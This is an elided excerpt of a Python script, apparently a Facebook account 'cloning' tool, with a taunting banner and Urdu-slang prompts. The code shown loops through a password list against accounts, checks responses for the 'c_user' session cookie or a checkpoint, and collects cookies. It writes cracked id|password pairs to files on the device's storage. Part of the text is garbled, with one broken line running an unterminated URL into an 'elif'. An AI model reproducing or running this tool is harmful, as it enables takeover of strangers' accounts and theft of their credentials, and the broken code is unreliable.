...
\033[1;37m--------------------------------------------------
[~] Author   : Ramzan  ka father 
[~] Facebook : prince king hu yawr 
[~] Tool     : free for poor cloners
[~] Version  : KIYA KRE GA DEKH KR SALI
\033[1;37m----------------------------------------------""")
def linex():
	print('\033[1;37m----------------------------------------------')
def clear():
...
def menu():
		...
		#	os.system('xdg-open https://www.facebook.com/dr.paigham')
			if xd in ['1','01']:
				...
				plist = []
				try:
					ps_limit = int(input(' Password ktne add kre ga bey? '))
				except:
					ps_limit =1
				clear()
				...
				clear()
				print(' Do you went show LOL account? (y/n): ')
				linex()
				cx=input(' Choose: ')
				...
				os.system('xdg-open https://Youtube.com/https://youtube.com/@missdesinar?si=NrDR73_ssNHoBxU          elif 
				exit(' Thanks for use 🥰 ')
			else:
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in TRT:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [TRT-MALL] %s | %s'%(ids,pas))
				open('/sdcard/TRT-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in TRT:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [TRT-LOL] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/TRT-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
